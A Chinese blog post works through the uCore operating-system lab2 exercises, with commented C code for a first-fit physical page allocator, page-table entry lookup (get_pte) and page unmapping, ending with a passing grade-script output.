<h2 id="uCore内存管理类"><a href="#uCore内存管理类" class="headerlink" title="uCore内存管理类"></a>uCore内存管理类</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pmm_manager</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;                                 <span class="comment">// 名字</span></span><br><span class="line">    <span class="keyword">void</span> (*init)(<span class="keyword">void</span>);                               <span class="comment">// 初始化             </span></span><br><span class="line">    <span class="keyword">void</span> (*init_memmap)(struct Page *base, <span class="keyword">size_t</span> n); <span class="comment">// 根据初始物理内存空间设置描述和管理数据结构</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *(*<span class="title">alloc_pages</span>)(<span class="title">size_t</span> <span class="title">n</span>);</span>            <span class="comment">// 分配页</span></span><br><span class="line">    <span class="keyword">void</span> (*free_pages)(struct Page *base, <span class="keyword">size_t</span> n);  <span class="comment">// 释放页</span></span><br><span class="line">    <span class="keyword">size_t</span> (*nr_free_pages)(<span class="keyword">void</span>);                    <span class="comment">// 返回空闲页数</span></span><br><span class="line">    <span class="keyword">void</span> (*check)(<span class="keyword">void</span>);                              <span class="comment">// 检验管理器的正确性</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PDXSHIFT        22                     </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PDX(la) ((((uintptr_t)(la)) &gt;&gt; PDXSHIFT) &amp; 0x3FF) </span></span><br><span class="line"><span class="comment">/* 获取&quot;页目录项PDE&quot;的索引:用来在页目录中定位一个页表 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTXSHIFT        12  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTX(la) ((((uintptr_t)(la)) &gt;&gt; PTXSHIFT) &amp; 0x3FF)</span></span><br><span class="line"><span class="comment">/* 获取&quot;页表项PTE&quot;的索引:用来在页表中定位具体的物理页 */</span></span><br></pre></td></tr></table></figure>
<p>还有一些关于内存管理的宏定义：</p>
<ul>
<li>PDX(la)：可以用来获取 Directory，对应页目录项的索引</li>
<li>PTX(la)：可以用来获取 Table，对应表项（物理页）的索引</li>
<li>KADDR(pa)：返回物理地址pa对应的虚拟地址</li>
<li>set_page_ref(page,1)：设置此页被引用一次</li>
<li>page2pa(page)：得到page管理的那一页的物理地址</li>
<li>struct Page * alloc_page()：分配一页出来</li>
<li>memset(void * s, char c, size_t n)：设置s指向地址的前面n个字节为‘c’</li>
<li>PTE_P 0x001 ：表示物理内存页存在</li>
<li>PTE_W 0x002 ：表示物理内存页内容可写</li>
<li>PTE_U 0x004 ：表示可以读取对应地址的物理内存页内容</li>
</ul>
<h2 id="练习0-把-lab1-的内容复制粘贴到-lab2"><a href="#练习0-把-lab1-的内容复制粘贴到-lab2" class="headerlink" title="练习0-把 lab1 的内容复制粘贴到 lab2"></a>练习0-把 lab1 的内容复制粘贴到 lab2</h2><h2 id="练习1-实现-first-fit-连续物理内存分配算法"><a href="#练习1-实现-first-fit-连续物理内存分配算法" class="headerlink" title="练习1-实现 first-fit 连续物理内存分配算法"></a>练习1-实现 first-fit 连续物理内存分配算法</h2><p>分析 ucore 自带的代码：</p>
<p><strong>default_init_memmap：</strong>根据每个物理页帧（一个地址连续的 4K 字节大小单元内存）的情况来建立空闲页链表，且空闲页块应该是根据地址高低形成一个有序链表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PageReserved(page)          test_bit(PG_reserved, &amp;((page)-&gt;flags))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">default_init_memmap</span><span class="params">(struct Page *base, <span class="keyword">size_t</span> n)</span> </span>&#123; </span><br><span class="line">    <span class="comment">/* base:基地址,n:表示要初始化n个页 */</span></span><br><span class="line">    assert(n &gt; <span class="number">0</span>); <span class="comment">/* 断言表达式&quot;n&gt;0&quot;成立,否则调用panic来终止程序 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> =</span> base;</span><br><span class="line">    <span class="keyword">for</span> (; p != base + n; p ++) &#123;</span><br><span class="line">        assert(PageReserved(p)); <span class="comment">/* 进行检查(这里不需要关心) */</span></span><br><span class="line">        p-&gt;flags = p-&gt;property = <span class="number">0</span>; <span class="comment">/* 设置flags &amp; 置空property(只有base page的property才会起作用) */</span></span><br><span class="line">        set_page_ref(p, <span class="number">0</span>); <span class="comment">/* 设置该物理页面的引用次数为0 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    base-&gt;property = n; <span class="comment">/* 在base page中设置空闲的连续page数量 */</span></span><br><span class="line">    SetPageProperty(base); <span class="comment">/* 设置当前页为空闲 */</span></span><br><span class="line">    nr_free += n; <span class="comment">/* nr_free:空闲页的总数 */</span></span><br><span class="line">    list_add(&amp;free_list, &amp;(base-&gt;page_link)); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>基于 base 来确定空闲页基地址，根据 n 来获取所需空闲页的数目</li>
<li>只有 base page 的 property 才会起作用，其他 page 的 property 置为0</li>
<li>进行一系列初始化，最后执行 list_add 添加入空闲页链表</li>
</ul>
<p><strong>default_alloc_pages：</strong>分配指定数目的内存页</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct Page *</span></span><br><span class="line"><span class="function"><span class="title">default_alloc_pages</span><span class="params">(<span class="keyword">size_t</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* n:表示要分配n个页 */</span></span><br><span class="line">    assert(n &gt; <span class="number">0</span>); <span class="comment">/* 断言表达式&quot;n&gt;0&quot;成立,否则调用panic来终止程序 */</span></span><br><span class="line">    <span class="keyword">if</span> (n &gt; nr_free) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">/* 申请内存页的数目&gt;空闲内存页的数目 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = &amp;free_list; <span class="comment">/* 初始化le为链表头部 */</span></span><br><span class="line">    <span class="keyword">while</span> ((le = list_next(le)) != &amp;free_list) &#123; <span class="comment">/* 实现first-fit算法 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> =</span> le2page(le, page_link); <span class="comment">/* 根据链表信息获取该page的位置 */</span></span><br><span class="line">        <span class="keyword">if</span> (p-&gt;property &gt;= n) &#123; <span class="comment">/* 如果空闲页够用,就进行分配 */</span></span><br><span class="line">            page = p;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (page != <span class="literal">NULL</span>) &#123; <span class="comment">/* 成功获取空闲页 */</span></span><br><span class="line">        list_del(&amp;(page-&gt;page_link)); <span class="comment">/* 脱链操作 */</span></span><br><span class="line">        <span class="keyword">if</span> (page-&gt;property &gt; n) &#123; <span class="comment">/* 检查是否有剩余 */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> =</span> page + n; <span class="comment">/* 指向剩下的空闲页 */</span></span><br><span class="line">            p-&gt;property = page-&gt;property - n; <span class="comment">/* 更新base page-&gt;property */</span></span><br><span class="line">            list_add(&amp;free_list, &amp;(p-&gt;page_link)); <span class="comment">/* 重新链回链表 */</span></span><br><span class="line">        &#125;</span><br><span class="line">        nr_free -= n; <span class="comment">/* 更新空闲页的数目 */</span></span><br><span class="line">        ClearPageProperty(page); <span class="comment">/* 将分配出去的内存页标记为非空闲 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> page; <span class="comment">/* 返回目标页 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>首先检查空闲页的总数目和所需数目的关系</li>
<li>然后采用 first-fit 算法来获取合适空闲页</li>
<li>最后检查该空闲块是否剩余，如果剩余直接插到链表头部</li>
</ul>
<p><strong>default_free_pages：</strong>释放目标n个内存页</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">default_free_pages</span><span class="params">(struct Page *base, <span class="keyword">size_t</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* base:基地址,n:表示要初始化n个页 */</span></span><br><span class="line">    assert(n &gt; <span class="number">0</span>); </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> =</span> base;</span><br><span class="line">    <span class="keyword">for</span> (; p != base + n; p ++) &#123; <span class="comment">/* 把将要被释放的内存页的各个字段置空 */</span></span><br><span class="line">        assert(!PageReserved(p) &amp;&amp; !PageProperty(p));</span><br><span class="line">        p-&gt;flags = <span class="number">0</span>;</span><br><span class="line">        set_page_ref(p, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    base-&gt;property = n; <span class="comment">/* 更新base page-&gt;property */</span></span><br><span class="line">    SetPageProperty(base); <span class="comment">/* 设置当前页为空闲 */</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = list_next(&amp;free_list);  <span class="comment">/* 初始化le为链表头部 */</span></span><br><span class="line">    <span class="keyword">while</span> (le != &amp;free_list) &#123; <span class="comment">/* 遍历整个链表,找寻是否有相邻的空闲页 */</span></span><br><span class="line">        p = le2page(le, page_link); <span class="comment">/* 根据链表信息获取该page的位置 */</span></span><br><span class="line">        le = list_next(le); </span><br><span class="line">        <span class="keyword">if</span> (base + base-&gt;property == p) &#123; <span class="comment">/* 在base的高地址处有相邻的空闲页 */</span></span><br><span class="line">            base-&gt;property += p-&gt;property; <span class="comment">/* 合并空闲页,更新base page-&gt;property */</span></span><br><span class="line">            ClearPageProperty(p); <span class="comment">/* 将被合并的空闲页标记为不可用 */</span></span><br><span class="line">            list_del(&amp;(p-&gt;page_link)); <span class="comment">/* 脱链 */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p + p-&gt;property == base) &#123; <span class="comment">/* 在base的低地址处有相邻的空闲页 */</span></span><br><span class="line">            p-&gt;property += base-&gt;property; </span><br><span class="line">            ClearPageProperty(base); </span><br><span class="line">            base = p; <span class="comment">/* 更新base */</span></span><br><span class="line">            list_del(&amp;(p-&gt;page_link));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    nr_free += n; <span class="comment">/* 更新空闲页数目 */</span></span><br><span class="line">    list_add(&amp;free_list, &amp;(base-&gt;page_link)); <span class="comment">/* 插入链表头 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>先把将要被释放的内存页的各个字段置空</li>
<li>然后遍历整个链表，合并相邻的空闲页</li>
<li>最后更新空闲页数目，并且把合并后的空闲页插入到链表的头部</li>
</ul>
<p>修改 ucore 的代码：</p>
<ul>
<li>问题的关键就在于“剩余空闲页插入链表头”这一过程</li>
<li>first-fit 算法要求将空闲内存块<strong>按照地址从小到大的方式</strong>连起来，那么“插入链表头”的操作想必会影响链表的物理地址次序</li>
<li>所以在 default_alloc_pages 和 default_free_pages 中关于“插入链表头”的操作都要修改</li>
</ul>
<p><strong>default_alloc_pages：</strong>（修改后）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct Page *</span></span><br><span class="line"><span class="function"><span class="title">default_alloc_pages</span><span class="params">(<span class="keyword">size_t</span> n)</span> </span>&#123;</span><br><span class="line">    assert(n &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (n &gt; nr_free) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = &amp;free_list;</span><br><span class="line">    <span class="keyword">while</span> ((le = list_next(le)) != &amp;free_list) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> =</span> le2page(le, page_link);</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;property &gt;= n) &#123;</span><br><span class="line">            page = p;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (page != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (page-&gt;property &gt; n) &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> =</span> page + n;</span><br><span class="line">            p-&gt;property = page-&gt;property - n;</span><br><span class="line">            list_add(&amp;(page-&gt;page_link), &amp;(p-&gt;page_link));</span><br><span class="line">        &#125;</span><br><span class="line">        list_del(&amp;(page-&gt;page_link)); <span class="comment">/* 注意:这里修改了脱链的位置 */</span></span><br><span class="line">        nr_free -= n;</span><br><span class="line">        ClearPageProperty(page);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>default_free_pages：</strong>（部分&amp;修改后）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(le = list_next(&amp;free_list); le != &amp;free_list; le = list_next(le))</span><br><span class="line">&#123;</span><br><span class="line">    p = le2page(le, page_link);</span><br><span class="line">    <span class="keyword">if</span> (base + base-&gt;property &lt;= p) &#123;</span><br><span class="line">        assert(base + base-&gt;property != p);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">list_add_before(le, &amp;(base-&gt;page_link));</span><br></pre></td></tr></table></figure>
<h2 id="练习2-实现寻找虚拟地址对应的页表项"><a href="#练习2-实现寻找虚拟地址对应的页表项" class="headerlink" title="练习2- 实现寻找虚拟地址对应的页表项"></a>练习2- 实现寻找虚拟地址对应的页表项</h2><p>通过设置页表和对应的页表项，可建立虚拟内存地址和物理内存地址的对应关系</p>
<p><code>get_pte</code> 函数是设置页表项环节中的一个重要步骤，此函数找到一个虚地址对应的二级页表项的内核虚拟地址，如果此二级页表项不存在，则分配一个包含此项的二级页表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pte_t</span> * <span class="comment">/* 获取pte(页表项,页表) */</span></span><br><span class="line">get_pte(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> la, <span class="keyword">bool</span> create) &#123;</span><br><span class="line">    <span class="comment">// pgdir:进程自己页表的虚拟地址,将在进程创建页表时为其赋值</span></span><br><span class="line">    <span class="comment">// la:线性地址,虚拟地址</span></span><br><span class="line">    <span class="comment">// create:信息标记位,根据create位判断是否创建这个二级页表</span></span><br><span class="line">   </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    <span class="keyword">pde_t</span> *pdep = <span class="literal">NULL</span>;   </span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">uintptr_t</span> pa = <span class="number">0</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;         </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求：</p>
<ul>
<li>查找页面目录条目</li>
<li>检查输入是否不存在</li>
<li>检查是否需要创建，然后为页表分配页</li>
<li>设置页面参考</li>
<li>获取页面的线性地址</li>
<li>使用 memset 清除页面内容</li>
<li>设置页面目录项的权限</li>
<li>返回页表项</li>
</ul>
<p>接下来就要完善这个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pte_t</span> * <span class="comment">/* 获取pte(页表项,页表) */</span></span><br><span class="line">get_pte(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> la, <span class="keyword">bool</span> create) &#123;</span><br><span class="line">    <span class="comment">// pgdir:进程自己页表的虚拟地址,将在进程创建页表时为其赋值</span></span><br><span class="line">    <span class="comment">// la:线性地址,虚拟地址</span></span><br><span class="line">    <span class="comment">// create:信息标记位,根据create位判断是否创建这个二级页表</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0 </span></span><br><span class="line">    <span class="keyword">pde_t</span> *pdep = <span class="literal">NULL</span>;   </span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span>) &#123;              </span><br><span class="line">        <span class="keyword">uintptr_t</span> pa = <span class="number">0</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;          </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> </span></span><br><span class="line">    <span class="keyword">pde_t</span> *pdep = &amp;pgdir[PDX(la)]; </span><br><span class="line">    <span class="comment">/* 根据la(线性地址,虚拟地址)利用PDX获取对应&quot;页目录项PDE的索引&quot; */</span></span><br><span class="line">    <span class="comment">/* 放入pgdir(进程自己一级页表的虚拟地址)中,索引出对应&quot;页目录项PDE的物理地址&quot; */</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!(*pdep &amp; PTE_P)) &#123; <span class="comment">/* 如果这个物理内存页pdep不存在 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span>;</span></span><br><span class="line">        <span class="keyword">if</span> (!create || (page = alloc_page()) == <span class="literal">NULL</span>) &#123; </span><br><span class="line">            <span class="comment">/* 检查是否需要创建 || 检查alloc_page()是否分配成功 */</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        set_page_ref(page, <span class="number">1</span>); <span class="comment">// 要查找该页表,则引用次数+1</span></span><br><span class="line">        <span class="keyword">uintptr_t</span> pa = page2pa(page); <span class="comment">// 得到该页的物理地址</span></span><br><span class="line">        <span class="built_in">memset</span>(KADDR(pa), <span class="number">0</span>, PGSIZE); <span class="comment">// 利用KADDR转成虚拟地址,并初始化</span></span><br><span class="line">        *pdep = pa | PTE_U | PTE_W | PTE_P; <span class="comment">// 设置页面目录项的权限(存在,可读,可写)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &amp;((<span class="keyword">pte_t</span> *)KADDR(PDE_ADDR(*pdep)))[PTX(la)];</span><br><span class="line">    <span class="comment">// 用KADDR返回二级页表所对应的虚拟地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="练习3-释放某虚地址所在的物理页并取消对应的二级页表项映射"><a href="#练习3-释放某虚地址所在的物理页并取消对应的二级页表项映射" class="headerlink" title="练习3-释放某虚地址所在的物理页并取消对应的二级页表项映射"></a>练习3-释放某虚地址所在的物理页并取消对应的二级页表项映射</h2><p>当释放一个包含某虚地址的物理内存页时，需要让对应此物理内存页的管理数据结构 Page 做相关的清除处理，使得此物理内存页成为空闲，另外还需把表示虚地址与物理地址对应关系的二级页表项清除</p>
<p>我们的任务就是补全一下这个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">page_remove_pte</span><span class="params">(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> la, <span class="keyword">pte_t</span> *ptep)</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span>) &#123;                     </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>; </span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求：</p>
<ul>
<li>检查此页表条目是否存在</li>
<li>找到与 pte 对应的页面</li>
<li>减少页面引用</li>
<li>并在页面引用达到0时释放此页面</li>
<li>清除第二页表格条目</li>
<li>齐平 tlb</li>
</ul>
<p>接下来就完善这个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> free_page(page) free_pages(page, 1)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">free_pages</span><span class="params">(struct Page *base, <span class="keyword">size_t</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        pmm_manager-&gt;free_pages(base, n);</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">page_ref_dec</span><span class="params">(struct Page *page)</span> </span>&#123;</span><br><span class="line">    page-&gt;ref -= <span class="number">1</span>; <span class="comment">/* page-&gt;ref:当前页被引用的次数,与内存共享有关 */</span></span><br><span class="line">    <span class="keyword">return</span> page-&gt;ref;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">page_remove_pte</span><span class="params">(<span class="keyword">pde_t</span> *pgdir, <span class="keyword">uintptr_t</span> la, <span class="keyword">pte_t</span> *ptep)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// pgdir:进程自己页表的虚拟地址,将在进程创建页表时为其赋值</span></span><br><span class="line">    <span class="comment">// la:线性地址,虚拟地址</span></span><br><span class="line">    <span class="comment">// ptep:将要被释放的页表条目(二级页表)</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span>) &#123;                      </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>; </span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (*ptep &amp; PTE_P) &#123; <span class="comment">/* 检查此页表条目是否存在 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span> =</span> pte2page(*ptep); <span class="comment">/* 获取该页表条目所对应的物理地址 */</span></span><br><span class="line">        <span class="keyword">if</span> (page_ref_dec(page) == <span class="number">0</span>) &#123; <span class="comment">/* 确保该物理页没有被共享 */</span></span><br><span class="line">            free_page(page); <span class="comment">/* 释放当前物理页 */</span></span><br><span class="line">        &#125;</span><br><span class="line">        *ptep = <span class="number">0</span>; <span class="comment">/* 置空该页表条目 */</span></span><br><span class="line">        tlb_invalidate(pgdir, la); <span class="comment">/* 刷新TLB内的数据 */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  lab2 make grade</span><br><span class="line">Check PMM:               (<span class="number">2.2</span>s)</span><br><span class="line">  -check pmm:                                OK</span><br><span class="line">  -check page table:                         OK</span><br><span class="line">  -check ticks:                              OK</span><br><span class="line">Total Score: <span class="number">50</span>/<span class="number">50</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
